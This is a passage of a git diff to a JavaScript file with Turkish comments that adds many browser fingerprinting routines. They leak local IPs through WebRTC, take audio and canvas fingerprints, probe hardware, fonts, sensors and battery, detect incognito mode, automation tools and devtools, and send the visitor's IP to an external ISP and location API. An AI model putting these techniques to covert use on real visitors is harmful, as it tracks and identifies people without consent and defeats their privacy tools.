+                el.className = `fixed bottom-8 right-6 px-5 py-3 rounded-2xl border backdrop-blur-md shadow-2xl z-[120] transition-all duration-500 transform translate-y-0 opacity-100 ${isSuccess ? 'bg-emerald-900/80 border-emerald-500/30' : 'bg-rose-900/80 border-rose-500/30'}`;
+                
+                setTimeout(() => {
+                    el.classList.add('translate-y-10', 'opacity-0');
+                }, 4000);
+            } catch (e) {
+                console.error("[UI] Status mesaj hatası:", e);
+            }
         }
     };
 
     /* ==========================================================================
-       MODÜL 6: İSTİHBARAT VE PARMAK İZİ (TÜM FONKSİYONLAR BİR NESNE İÇİNDE)
+       MODÜL 6: İSTİHBARAT VE PARMAK İZİ (GENİŞLETİLMİŞ)
        ========================================================================== */
     const Intelligence = {
         getLocalIP: async () => {
-            UI.logToTerminal('log_ip');
-            return new Promise(resolve => {
-                try {
+            try {
+                UI.logToTerminal('log_ip');
+                return new Promise(resolve => {
                     const pc = new RTCPeerConnection({ iceServers: [] });
                     pc.createDataChannel('');
                     pc.createOffer().then(o => pc.setLocalDescription(o));
                     pc.onicecandidate = (ice) => {
                         if (ice && ice.candidate) {
                             const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                            if (match) { pc.close(); resolve(match[1]); }
+                            if (match) { pc.close(); resolve(match[1]); return; }
                         }
                     };
-                    setTimeout(() => resolve("HIDDEN (VPN/Proxy)"), 1500); 
-                } catch (e) { resolve("N/A"); }
-            });
+                    setTimeout(() => resolve("HIDDEN (VPN/Proxy)"), CONFIG.SECURITY.SCAN_TIMEOUT); 
+                });
+            } catch (e) {
+                console.error("[Intelligence] getLocalIP Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getWebRTCIPs: async () => {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: CONFIG.WEBRTC_SERVERS.map(url => ({ urls: url })) });
+                pc.createDataChannel('');
+                await pc.createOffer().then(o => pc.setLocalDescription(o));
+                
+                const candidates = [];
+                pc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/)?.[1];
+                        if (ip && !candidates.includes(ip)) candidates.push(ip);
+                    }
+                };
+                
+                await new Promise(r => setTimeout(r, CONFIG.SECURITY.SCAN_TIMEOUT));
+                pc.close();
+                return candidates.join(", ") || "No IPs Found";
+            } catch (e) { 
+                console.error("[Intelligence] getWebRTCIPs Hatası:", e);
+                return "WebRTC Blocked"; 
+            }
+        },
+
+        // Gelişmiş WebRTC IP Sızıntısı
+        getAdvancedWebRTCIPs: async () => {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: CONFIG.WEBRTC_SERVERS.map(url => ({ urls: url })) });
+                pc.createDataChannel('');
+                await pc.createOffer().then(o => pc.setLocalDescription(o));
+                
+                const candidates = [];
+                pc.onicecandidate = (e) => {
+                    if (e.candidate && e.candidate.type === 'srflx') {  // Yerel IP için srflx adaylarını hedefle
+                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/)?.[1];
+                        if (ip && !candidates.includes(ip)) candidates.push(ip);
+                    }
+                };
+                
+                await new Promise(r => setTimeout(r, CONFIG.SECURITY.SCAN_TIMEOUT * 2));  // Daha uzun bekle
+                pc.close();
+                return candidates.join(", ") || "No Advanced IPs Found";
+            } catch (e) { 
+                console.error("[Intelligence] getAdvancedWebRTCIPs Hatası:", e);
+                return "N/A"; 
+            }
         },
 
         getAudioFingerprint: async () => {
             try {
-                const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, CONFIG.AUDIO_SAMPLE_RATE, CONFIG.AUDIO_SAMPLE_RATE);
                 const osc = ctx.createOscillator();
                 osc.type = "triangle";
                 osc.frequency.setValueAtTime(10000, ctx.currentTime);
                 const compress = ctx.createDynamicsCompressor();
-                [[-50, -50], [40, 40]].forEach(p => {
-                    compress.threshold.setValueAtTime(p[0], ctx.currentTime);
-                    compress.knee.setValueAtTime(p[1], ctx.currentTime);
-                });
+                compress.threshold.setValueAtTime(-50, ctx.currentTime);
+                compress.knee.setValueAtTime(30, ctx.currentTime);
+                compress.ratio.setValueAtTime(12, ctx.currentTime);
+                compress.attack.setValueAtTime(0, ctx.currentTime);
+                compress.release.setValueAtTime(0.25, ctx.currentTime);
                 osc.connect(compress);
                 compress.connect(ctx.destination);
                 osc.start(0);
@@ -963,7 +1272,43 @@ document.addEventListener('DOMContentLoaded', () => {
                     hash += Math.abs(render.getChannelData(0)[i]);
                 }
                 return "AF-" + hash.toString().slice(0, 10);
-            } catch (e) { return "AF-ERROR"; }
+            } catch (e) { 
+                console.error("[Intelligence] getAudioFingerprint Hatası:", e);
+                return "N/A"; 
+            }
+        },
+
+        getAdvancedAudioFP: async () => {
+            try {
+                const ctx = new AudioContext();
+                await ctx.resume();  // Kullanıcı etkileşimi sonrası resume
+                const osc = ctx.createOscillator();
+                const analyser = ctx.createAnalyser();
+                osc.connect(analyser);
+                analyser.connect(ctx.destination);
+                
+                const types = ["sine", "square", "sawtooth", "triangle"];
+                const hashes = {};
+                
+                for (let type of types) {
+                    osc.type = type;
+                    osc.frequency.value = 440;
+                    osc.start();
+                    await new Promise(r => setTimeout(r, 100));
+                    const data = new Float32Array(analyser.frequencyBinCount);
+                    analyser.getFloatFrequencyData(data);
+                    let hash = 0;
+                    data.forEach(v => hash += Math.abs(v));
+                    hashes[type] = hash.toFixed(2);
+                    osc.stop();
+                }
+                
+                ctx.close();
+                return hashes;
+            } catch (e) { 
+                console.error("[Intelligence] getAdvancedAudioFP Hatası:", e);
+                return { }; 
+            }
         },
 
         getCanvasFingerprint: () => {
@@ -982,47 +1327,148 @@ document.addEventListener('DOMContentLoaded', () => {
                     crc = (crc >>> 8) ^ bin.charCodeAt(i);
                 }
                 return "CF-" + (crc >>> 0).toString(16);
-            } catch (e) { return "CF-ERROR"; }
+            } catch (e) { 
+                console.error("[Intelligence] getCanvasFingerprint Hatası:", e);
+                return "N/A"; 
+            }
+        },
+
+        getCanvasVariations: () => {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 400;
+                canvas.height = 100;
+                const ctx = canvas.getContext('2d');
+                const hashes = [];
+                
+                CONFIG.CANVAS_TEST_TEXTS.forEach((text, idx) => {
+                    CONFIG.FONT_TEST_LIST.forEach(font => {
+                        ctx.font = `20px ${font}`;
+                        ctx.fillStyle = `hsl(${idx * 120}, 50%, 50%)`;
+                        ctx.fillText(text, 10, 30 + idx * 30);
+                    });
+                });
+                
+                const b64 = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < b64.length; i += 10) {
+                    hash += b64.charCodeAt(i);
+                }
+                return "CV-" + hash.toString(16);
+            } catch (e) { 
+                console.error("[Intelligence] getCanvasVariations Hatası:", e);
+                return "N/A"; 
+            }
+        },
+
+        // Canvas Noise Bypass
+        getCanvasNoiseBypass: (canvasFP) => {
+            try {
+                // Matematiksel tutarlılık kontrolü (basit simülasyon)
+                if (canvasFP.length < 10) return "Noise Detected";
+                return "Clean";
+            } catch (e) {
+                console.error("[Intelligence] getCanvasNoiseBypass Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        // Audio Noise Bypass
+        getAudioNoiseBypass: (audioFP) => {
+            try {
+                // Hash tutarlılık kontrolü
+                if (audioFP === "AF-ERROR") return "Noise Detected";
+                return "Clean";
+            } catch (e) {
+                console.error("[Intelligence] getAudioNoiseBypass Hatası:", e);
+                return "N/A";
+            }
         },
 
         getSystemSpecs: async () => {
-            let gpu = "Generic GPU";
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                if (ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-            } catch(e) {}
+                let gpu = "Generic GPU";
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+                } catch(e) {}
 
-            return {
-                cores: navigator.hardwareConcurrency || "Unknown",
-                ram: navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Unknown",
-                platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
-                gpu: gpu,
-                userAgent: navigator.userAgent
-            };
+                return {
+                    cores: navigator.hardwareConcurrency || "Unknown",
+                    ram: navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Unknown",
+                    platform: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
+                    gpu: gpu,
+                    userAgent: navigator.userAgent
+                };
+            } catch (e) {
+                console.error("[Intelligence] getSystemSpecs Hatası:", e);
+                return { cores: "N/A", ram: "N/A", platform: "N/A", screen: "N/A", gpu: "N/A", userAgent: "N/A" };
+            }
         },
 
-        getGeolocation: () => {
-            return new Promise(resolve => {
-                if (!navigator.geolocation) return resolve("Geo Not Supported");
-                navigator.geolocation.getCurrentPosition(
-                    (p) => resolve(`Lat: ${p.coords.latitude.toFixed(4)}, Lon: ${p.coords.longitude.toFixed(4)} (±${p.coords.accuracy}m)`),
-                    (err) => resolve(`Geo Denied/Error (${err.code})`),
-                    { timeout: 4000, maximumAge: 0 }
-                );
-            });
+        // CPU Sınıfı Analizi (WASM Benchmark)
+        getCPUClass: async () => {
+            try {
+                const module = await WebAssembly.compile(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x07,0x01,0x60,0x02,0x7f,0x7f,0x01,0x7f,0x03,0x02,0x01,0x00,0x07,0x07,0x01,0x03,0x61,0x64,0x64,0x00,0x00,0x0a,0x09,0x01,0x07,0x00,0x20,0x00,0x20,0x01,0x6a,0x0b])); // Basit WASM modülü
+                const instance = await WebAssembly.instantiate(module, {});
+                const start = performance.now();
+                let result = 0;
+                for (let i = 0; i < 1e7; i++) {
+                    result = instance.exports.add(result, i);
+                }
+                const time = performance.now() - start;
+                if (time < 100) return "High-End (e.g., i9/Ryzen 9)";
+                if (time < 200) return "Mid-Range (e.g., i5/Ryzen 5)";
+                return "Low-End (e.g., i3/Ryzen 3)";
+            } catch (e) {
+                console.error("[Intelligence] getCPUClass Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getGeolocation: async () => {
+            try {
+                const geoPerm = await navigator.permissions.query({ name: "geolocation" });
+                return geoPerm.state === "granted" ? "Granted" : geoPerm.state;
+            } catch (e) { 
+                console.error("[Intelligence] getGeolocation Hatası:", e);
+                return "N/A";
+            }
         },
 
         getBatteryStatus: async () => {
-            if ('getBattery' in navigator) {
-                try {
+            try {
+                if ('getBattery' in navigator) {
                     const b = await navigator.getBattery();
-                    return `${Math.round(b.level * 100)}% [${b.charging ? 'Charging' : 'Discharging'}]`;
-                } catch (e) { return "Access Error"; }
+                    return `${Math.round(b.level * 100)}% [ ${b.charging ? 'Charging' : 'Discharging'}]`;
+                }
+                return "API Not Supported";
+            } catch (e) { 
+                console.error("[Intelligence] getBatteryStatus Hatası:", e);
+                return "N/A"; 
             }
-            return "API Not Supported";
+        },
+
+        // Şarj Döngüsü Takibi
+        getChargingCycle: async () => {
+            try {
+                if ('getBattery' in navigator) {
+                    const b = await navigator.getBattery();
+                    let cycle = "Stable";
+                    b.addEventListener('levelchange', () => {
+                        cycle = "Changing";
+                    });
+                    await new Promise(r => setTimeout(r, 1000)); // 1s gözlem
+                    return cycle;
+                }
+                return "N/A";
+            } catch (e) {
+                console.error("[Intelligence] getChargingCycle Hatası:", e);
+                return "N/A";
+            }
         },
 
         getTimeZoneAnalysis: () => {
@@ -1041,27 +1487,54 @@ document.addEventListener('DOMContentLoaded', () => {
                     dst_status: isDst ? "Active (+1h)" : "Inactive",
                     local_time: now.toLocaleTimeString()
                 };
-            } catch (e) { return { error: "Timezone Error" }; }
+            } catch (e) { 
+                console.error("[Intelligence] getTimeZoneAnalysis Hatası:", e);
+                return { zone: "N/A" }; 
+            }
         },
 
         getNetworkQuality: () => {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            
-            if (!conn) return { status: "API Not Supported" };
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                
+                if (!conn) return { type: "N/A", downlink: "N/A" };
 
-            return {
-                type: conn.effectiveType ? conn.effectiveType.toUpperCase() : "UNKNOWN",
-                rtt_latency: conn.rtt ? `${conn.rtt}ms` : "N/A",
-                downlink: conn.downlink ? `~${conn.downlink} Mbps` : "N/A",
-                save_data: conn.saveData ? "ENABLED" : "DISABLED"
-            };
+                return {
+                    type: conn.effectiveType ? conn.effectiveType.toUpperCase() : "UNKNOWN",
+                    rtt_latency: conn.rtt ? `${conn.rtt}ms` : "N/A",
+                    downlink: conn.downlink ? `~${conn.downlink} Mbps` : "N/A",
+                    save_data: conn.saveData ? "ENABLED" : "DISABLED"
+                };
+            } catch (e) {
+                console.error("[Intelligence] getNetworkQuality Hatası:", e);
+                return { type: "N/A", downlink: "N/A" };
+            }
+        },
+
+        // ISP ve Proxy Tespiti (Genişletildi: country, lat, lon eklendi)
+        getISPInfo: async (ip) => {
+            try {
+                const response = await fetch(CONFIG.ISP_API_URL + ip, { signal: AbortSignal.timeout(2000) });
+                const data = await response.json();
+                return {
+                    isp: data.isp || "N/A",
+                    isProxy: data.proxy ? "Yes" : "No",
+                    isDatacenter: data.hosting ? "Yes" : "No",
+                    country: data.countryCode || "N/A",
+                    lat: data.lat || 0,
+                    lon: data.lon || 0
+                };
+            } catch (e) {
+                console.error("[Intelligence] getISPInfo Hatası:", e);
+                return { };
+            }
         },
 
         getAdvancedGPU: () => {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return { error: "No WebGL" };
+                if (!gl) return { renderer: "N/A" };
 
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 
@@ -1076,181 +1549,1073 @@ document.addEventListener('DOMContentLoaded', () => {
                     float_precision: highp ? `${highp.precision}/${highp.rangeMin}/${highp.rangeMax}` : "N/A",
                     shader_uniforms: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS)
                 };
-            } catch (e) { return { error: "GPU Access Denied" }; }
+            } catch (e) { 
+                console.error("[Intelligence] getAdvancedGPU Hatası:", e);
+                return { renderer: "N/A" }; 
+            }
+        },
+
+        getWebGLExtensions: () => {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return [];
+                
+                const extensions = gl.getSupportedExtensions();
+                State.webglExtensions = extensions;
+                return extensions.slice(0, 10).join(", "); // İlk 10'u döndür
+            } catch (e) { 
+                console.error("[Intelligence] getWebGLExtensions Hatası:", e);
+                return "N/A"; 
+            }
         },
 
         getFontAndRendering: () => {
-            const fontList = ["Segoe UI", "Roboto", "San Francisco", "Helvetica Neue", "Arial", "Ubuntu"];
-            const detectedFonts = [];
-            const span = document.createElement("span");
-            span.style.fontSize = "72px";
-            span.innerHTML = "mmmmmmmmmmlli";
-            span.style.visibility = "hidden"; 
-            document.body.appendChild(span);
-            
-            span.style.fontFamily = "sans-serif";
-            const baseWidth = span.offsetWidth;
-            
-            fontList.forEach(font => {
-                span.style.fontFamily = `${font}, sans-serif`;
-                if (span.offsetWidth !== baseWidth) detectedFonts.push(font);
-            });
-            document.body.removeChild(span);
-
-            let emojiHash = "N/A";
             try {
-                const c = document.createElement('canvas');
-                const ctx = c.getContext('2d');
-                ctx.font = "30px Arial";
-                ctx.fillText("😃🤖", 0, 30);
-                let b64 = c.toDataURL();
-                let hash = 0;
-                for (let i = 0; i < b64.length; i++) hash = ((hash << 5) - hash) + b64.charCodeAt(i);
-                emojiHash = hash;
-            } catch(e) {}
+                const fontList = ["Segoe UI", "Roboto", "San Francisco", "Helvetica Neue", "Arial", "Ubuntu", ...CONFIG.FONT_TEST_LIST];
+                const detectedFonts = [];
+                const span = document.createElement("span");
+                span.style.fontSize = "72px";
+                span.innerHTML = "mmmmmmmmmmlli";
+                span.style.visibility = "hidden"; 
+                document.body.appendChild(span);
+                
+                span.style.fontFamily = "sans-serif";
+                const baseWidth = span.offsetWidth;
+                
+                fontList.forEach(font => {
+                    span.style.fontFamily = `${font}, sans-serif`;
+                    if (span.offsetWidth !== baseWidth) detectedFonts.push(font);
+                });
+                document.body.removeChild(span);
 
-            return {
-                detected_fonts: detectedFonts.join(", ") || "Generic/Linux",
-                emoji_fingerprint: emojiHash,
-                sub_pixel: window.devicePixelRatio || 1
-            };
+                let emojiHash = "N/A";
+                try {
+                    const c = document.createElement('canvas');
+                    const ctx = c.getContext('2d');
+                    ctx.font = "30px Arial";
+                    ctx.fillText("😃🤖", 0, 30);
+                    let b64 = c.toDataURL();
+                    let hash = 0;
+                    for (let i = 0; i < b64.length; i++) hash = ((hash << 5) - hash) + b64.charCodeAt(i);
+                    emojiHash = hash;
+                } catch(e) {}
+
+                return {
+                    detected_fonts: detectedFonts.join(", ") || "Generic/Linux",
+                    emoji_fingerprint: emojiHash,
+                    sub_pixel: window.devicePixelRatio || 1
+                };
+            } catch (e) {
+                console.error("[Intelligence] getFontAndRendering Hatası:", e);
+                return { detected_fonts: "N/A" };
+            }
         },
 
         getStorageInsights: async () => {
-            let quotaInfo = "N/A";
-            let isIncognito = false;
+            try {
+                let quotaInfo = "N/A";
+                let isIncognito = false;
 
-            if (navigator.storage && navigator.storage.estimate) {
-                try {
+                if (navigator.storage && navigator.storage.estimate) {
                     const estimate = await navigator.storage.estimate();
                     const quotaGB = (estimate.quota / (1024 ** 3)).toFixed(2);
                     quotaInfo = `${quotaGB} GB`;
                     if (estimate.quota < 120000000) isIncognito = true;
-                } catch(e) {}
+                }
+
+                const idbSupport = 'indexedDB' in window;
+                if (!idbSupport) isIncognito = true;
+
+                return {
+                    has_indexed_db: idbSupport,
+                    storage_quota: quotaInfo,
+                    likely_incognito: isIncognito
+                };
+            } catch (e) {
+                console.error("[Intelligence] getStorageInsights Hatası:", e);
+                return { storage_quota: "N/A", likely_incognito: false };
             }
-
-            const idbSupport = 'indexedDB' in window;
-            if (!idbSupport) isIncognito = true;
-
-            return {
-                has_indexed_db: idbSupport,
-                storage_quota: quotaInfo,
-                likely_incognito: isIncognito
-            };
         },
 
         getSensorNoise: () => {
-            const accel = State.sensors.accel || {x:0, y:0, z:0};
-            
-            const magnitude = Math.sqrt(accel.x**2 + accel.y**2 + accel.z**2);
-            
-            const noise = Math.abs(magnitude - 9.8); 
-            
-            return {
-                noise_level: noise.toFixed(5),
-                is_emulator_suspect: noise < 0.0001,
-                touch_points: navigator.maxTouchPoints || 0
-            };
+            try {
+                const accel = State.sensors.accel || {x:0, y:0, z:0};
+                
+                const magnitude = Math.sqrt(accel.x**2 + accel.y**2 + accel.z**2);
+                
+                const noise = Math.abs(magnitude - 9.8); 
+                
+                return {
+                    noise_level: noise.toFixed(5),
+                    is_emulator_suspect: noise < 0.0001,
+                    touch_points: navigator.maxTouchPoints || 0
+                };
+            } catch (e) {
+                console.error("[Intelligence] getSensorNoise Hatası:", e);
+                return { touch_points: 0 };
+            }
         }, 
         
-                // --- YENİ EKLENECEKLER BAŞLANGIÇ ---
-
-        // 6.13 Medya Cihazları (Kamera/Mikrofon) Varlığı
-        // Sunucularda (AWS, Azure vb.) kamera ve mikrofon donanımı yoktur.
         getMediaDevices: async () => {
             try {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
-                    return { error: "Not Supported" };
-                }
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoInputs = devices.filter(d => d.kind === 'videoinput').length;
-                const audioInputs = devices.filter(d => d.kind === 'audioinput').length;
-                
-                // Etiketler (Label) izin verilmezse boş döner ama sayı dönmek zorundadır.
+                const cameraPerm = await navigator.permissions.query({ name: 'camera' });
+                const micPerm = await navigator.permissions.query({ name: 'microphone' });
                 return {
-                    cams: videoInputs,
-                    mics: audioInputs,
-                    total_devices: devices.length,
-                    is_suspicious: (videoInputs === 0 && audioInputs === 0) // Mobil/Desktop cihazda 0 olması şüphelidir
+                    camera_status: cameraPerm.state,
+                    mic_status: micPerm.state
                 };
-            } catch (e) { return { error: "Media Access Blocked" }; }
+            } catch (e) { 
+                console.error("[Intelligence] getMediaDevices Hatası:", e);
+                return { camera_status: "N/A", mic_status: "N/A" }; 
+            }
         },
 
-        // 6.14 Gelişmiş Otomasyon ve Bot Bayrakları (Red Pills)
-        // Selenium, Puppeteer gibi araçların bıraktığı JavaScript izleri.
         getAutomationFlags: () => {
-            const flags = [];
-            const w = window;
-            const n = navigator;
+            try {
+                const flags = [];
+                const w = window;
+                const n = navigator;
 
-            // Yaygın otomasyon değişkenleri
-            if (w.document.documentElement.getAttribute("webdriver")) flags.push("DOM Webdriver");
-            if (w.callPhantom || w._phantom) flags.push("PhantomJS");
-            if (w.__nightmare) flags.push("NightmareJS");
-            if (n.webdriver) flags.push("Navigator Webdriver");
-            if (w.cdc_adoQpoasnfa76pfcZLmcfl_Array) flags.push("Selenium CDC"); // Çok güçlü bir tespit
-            if (w.buffer) flags.push("NodeJS Buffer"); // Tarayıcıda NodeJS buffer varsa şüpheli
+                if (w.document.documentElement.getAttribute("webdriver")) flags.push("DOM Webdriver");
+                if (w.callPhantom || w._phantom) flags.push("PhantomJS");
+                if (w.__nightmare) flags.push("NightmareJS");
+                if (n.webdriver) flags.push("Navigator Webdriver");
+                if (w.cdc_adoQpoasnfa76pfcZLmcfl_Array) flags.push("Selenium CDC");
+                if (w.buffer) flags.push("NodeJS Buffer");
+
+                return {
+                    detected_flags: flags.join(", ") || "None",
+                    is_automated: flags.length > 0
+                };
+            } catch (e) {
+                console.error("[Intelligence] getAutomationFlags Hatası:", e);
+                return { detected_flags: "N/A" };
+            }
+        },
+
+        getScreenConsistency: () => {
+            try {
+                const widthDiff = window.outerWidth - window.innerWidth;
+                const heightDiff = window.outerHeight - window.innerHeight;
+                
+                const likelyDevToolsOpen = (widthDiff > 160) || (heightDiff > 160);
+                
+                return {
+                    dims_outer: `${window.outerWidth}x${window.outerHeight}`,
+                    dims_inner: `${window.innerWidth}x${window.innerHeight}`,
+                    devtools_open: likelyDevToolsOpen ? "POSSIBLE" : "No",
+                    screen_avail: `${window.screen.availWidth}x${window.screen.availHeight}`
+                };
+            } catch (e) {
+                console.error("[Intelligence] getScreenConsistency Hatası:", e);
+                return { devtools_open: "N/A" };
+            }
+        },
+
+        // Ekran Yenileme Hızı
+        getRefreshRate: async () => {
+            try {
+                let rate = 60;
+                let lastTime = performance.now();
+                let frames = 0;
+                const check = () => {
+                    frames++;
+                    const time = performance.now();
+                    if (time - lastTime >= 1000) {
+                        rate = frames;
+                        return;
+                    }
+                    requestAnimationFrame(check);
+                };
+                requestAnimationFrame(check);
+                await new Promise(r => setTimeout(r, 1100));
+                return rate;
+            } catch (e) {
+                console.error("[Intelligence] getRefreshRate Hatası:", e);
+                return 60;
+            }
+        },
+
+        getAmbientLight: () => {
+            return new Promise(resolve => {
+                try {
+                    if ('AmbientLightSensor' in window) {
+                        const sensor = new AmbientLightSensor();
+                        sensor.onreading = () => {
+                            State.sensors.light = sensor.illuminance;
+                            resolve(`Illuminance: ${sensor.illuminance} lux`);
+                            sensor.stop();
+                        };
+                        sensor.onerror = (e) => resolve("Permission Denied");
+                        sensor.start();
+                    } else {
+                        resolve("Not Supported");
+                    }
+                } catch (e) { 
+                    console.error("[Intelligence] getAmbientLight Hatası:", e);
+                    resolve("N/A"); 
+                }
+            });
+        },
+
+        getMagnetometer: () => {
+            return new Promise(resolve => {
+                try {
+                    if ('Magnetometer' in window) {
+                        const sensor = new Magnetometer();
+                        sensor.onreading = () => {
+                            State.sensors.magnetometer = { x: sensor.x, y: sensor.y, z: sensor.z };
+                            resolve(`Mag: X${sensor.x} Y ${sensor.y} Z ${sensor.z}`);
+                            sensor.stop();
+                        };
+                        sensor.onerror = (e) => resolve("Permission Denied");
+                        sensor.start();
+                    } else {
+                        resolve("Not Supported");
+                    }
+                } catch (e) { 
+                    console.error("[Intelligence] getMagnetometer Hatası:", e);
+                    resolve("N/A"); 
+                }
+            });
+        },
+
+        getVibrationSupport: () => {
+            try {
+                return 'vibrate' in navigator ? "Supported" : "Not Supported";
+            } catch (e) {
+                console.error("[Intelligence] getVibrationSupport Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getPerformanceTimings: () => {
+            try {
+                const perf = performance.getEntriesByType("navigation")[0];
+                State.performanceTimings = {
+                    loadTime: perf.loadEventEnd - perf.startTime,
+                    domInteractive: perf.domInteractive - perf.startTime
+                };
+                return State.performanceTimings;
+            } catch (e) { 
+                console.error("[Intelligence] getPerformanceTimings Hatası:", e);
+                return { loadTime: "N/A" }; 
+            }
+        },
+
+        getPluginsAndMime: () => {
+            try {
+                const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(", ");
+                const mimes = Array.from(navigator.mimeTypes || []).map(m => m.type).join(", ");
+                return { plugins, mimes };
+            } catch (e) {
+                console.error("[Intelligence] getPluginsAndMime Hatası:", e);
+                return { plugins: "N/A", mimes: "N/A" };
+            }
+        },
+
+        getTouchDetails: () => {
+            try {
+                return {
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    touchEventSupport: 'ontouchstart' in window ? "Yes" : "No"
+                };
+            } catch (e) {
+                console.error("[Intelligence] getTouchDetails Hatası:", e);
+                return { maxTouchPoints: 0 };
+            }
+        },
+
+        getKeyboardLayout: () => {
+            try {
+                return navigator.keyboard ? navigator.keyboard.layoutMap ? "Custom" : "Standard" : "Unknown";
+            } catch (e) {
+                console.error("[Intelligence] getKeyboardLayout Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getHistoryLength: () => {
+            try {
+                return history.length || 0;
+            } catch (e) {
+                console.error("[Intelligence] getHistoryLength Hatası:", e);
+                return 0;
+            }
+        },
+
+        getCookiesEnabled: () => {
+            try {
+                return navigator.cookieEnabled ? "Yes" : "No";
+            } catch (e) {
+                console.error("[Intelligence] getCookiesEnabled Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getDNTStatus: () => {
+            try {
+                return navigator.doNotTrack || "Not Set";
+            } catch (e) {
+                console.error("[Intelligence] getDNTStatus Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getLanguages: () => {
+            try {
+                return navigator.languages ? navigator.languages.join(", ") : navigator.language;
+            } catch (e) {
+                console.error("[Intelligence] getLanguages Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getWorkerPerformance: async () => {
+            try {
+                const worker = new Worker(URL.createObjectURL(new Blob(["postMessage(performance.now());"])));
+                const start = performance.now();
+                await new Promise(r => worker.onmessage = r);
+                const end = performance.now();
+                worker.terminate();
+                return (end - start).toFixed(2) + "ms";
+            } catch (e) { 
+                console.error("[Intelligence] getWorkerPerformance Hatası:", e);
+                return "N/A"; 
+            }
+        },
+
+        getMemoryUsage: () => {
+            try {
+                return performance.memory ? {
+                    totalJSHeapSize: (performance.memory.totalJSHeapSize / 1024 / 1024).toFixed(2) + " MB",
+                    usedJSHeapSize: (performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(2) + " MB"
+                } : { totalJSHeapSize: "N/A" };
+            } catch (e) {
+                console.error("[Intelligence] getMemoryUsage Hatası:", e);
+                return { totalJSHeapSize: "N/A" };
+            }
+        },
+
+        getCPUBenchmark: () => {
+            try {
+                const start = performance.now();
+                let result = 0;
+                for (let i = 0; i < CONFIG.BENCHMARK_LOOPS; i++) {
+                    result += Math.sqrt(i) * Math.sin(i);
+                }
+                const end = performance.now();
+                return {
+                    time: (end - start).toFixed(2) + "ms",
+                    score: (CONFIG.BENCHMARK_LOOPS / (end - start)).toFixed(0) + " ops/ms"
+                };
+            } catch (e) {
+                console.error("[Intelligence] getCPUBenchmark Hatası:", e);
+                return { score: "N/A" };
+            }
+        },
+
+        getProximitySensor: () => {
+            return new Promise(resolve => {
+                try {
+                    if ('ProximitySensor' in window) {
+                        const sensor = new ProximitySensor();
+                        sensor.onreading = () => {
+                            State.sensors.proximity = sensor.distance;
+                            resolve(`Distance: ${sensor.distance} cm`);
+                            sensor.stop();
+                        };
+                        sensor.onerror = () => resolve("Error");
+                        sensor.start();
+                    } else {
+                        resolve("Not Supported");
+                    }
+                } catch (e) { 
+                    console.error("[Intelligence] getProximitySensor Hatası:", e);
+                    resolve("N/A"); 
+                }
+            });
+        },
+
+        getBarometer: () => {
+            return new Promise(resolve => {
+                try {
+                    if ('Barometer' in window) {
+                        const sensor = new Barometer();
+                        sensor.onreading = () => {
+                            State.sensors.barometer = sensor.pressure;
+                            resolve(`Pressure: ${sensor.pressure} mbar`);
+                            sensor.stop();
+                        };
+                        sensor.onerror = () => resolve("Error");
+                        sensor.start();
+                    } else {
+                        resolve("Not Supported");
+                    }
+                } catch (e) { 
+                    console.error("[Intelligence] getBarometer Hatası:", e);
+                    resolve("N/A"); 
+                }
+            });
+        },
+
+        getClipboardStatus: async () => {
+            try {
+                const perm = await navigator.permissions.query({ name: "clipboard-read" });
+                return perm.state;
+            } catch (e) { 
+                console.error("[Intelligence] getClipboardStatus Hatası:", e);
+                return "N/A"; 
+            }
+        },
+
+        getNotificationStatus: async () => {
+            try {
+                const perm = await navigator.permissions.query({ name: "notifications" });
+                return perm.state;
+            } catch (e) { 
+                console.error("[Intelligence] getNotificationStatus Hatası:", e);
+                return "N/A"; 
+            }
+        },
+
+        getServiceWorkerSupport: () => {
